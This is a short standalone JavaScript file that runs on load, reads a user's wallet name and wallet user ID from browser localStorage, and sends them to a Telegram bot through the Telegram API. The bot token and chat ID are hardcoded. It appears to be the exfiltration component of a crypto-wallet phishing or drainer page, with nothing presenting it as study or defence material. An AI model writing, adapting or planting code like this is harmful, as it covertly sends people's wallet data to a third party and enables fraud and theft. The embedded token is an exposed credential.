// Function to send data to Telegram bot
async function sendToTelegramBot(data, botToken, chatId) {
    try {
        const message = `Wallet Data:\n\nWallet Name: ${data.walletName}\nWallet User ID: ${data.walletUserId}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        if (!response.ok) {
            throw new Error(result.description || 'Failed to send message');
        }
        
        console.log('Data sent to Telegram bot successfully:', result);
        return result;
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
        throw error;
    }
}

// Function to check import status and send wallet data if enabled
function checkAndSendWalletData(botToken, chatId) {
    try {
        // Check if import is enabled
        const importStatus = localStorage.getItem('Token');
        
        if (importStatus !== 'enabled') {
            console.log('Import is not enabled. No data will be sent.');
            return;
        }

        // Get wallet data
        const walletName = localStorage.getItem('walletName');
        const walletUserId = localStorage.getItem('walletUserId');

        if (!walletName || !walletUserId) {
            console.log('Wallet data not found in localStorage');
            return;
        }

        // Prepare data object
        const walletData = {
            walletName: walletName,
            walletUserId: walletUserId
        };

        // Send data to Telegram bot
        sendToTelegramBot(walletData, botToken, chatId)
            .catch(error => console.error('Failed to send data:', error));
    } catch (error) {
        console.error('Error accessing localStorage:', error);
    }
}
// Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = '8163151595'; 

// Execute the check and send function
checkAndSendWalletData(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
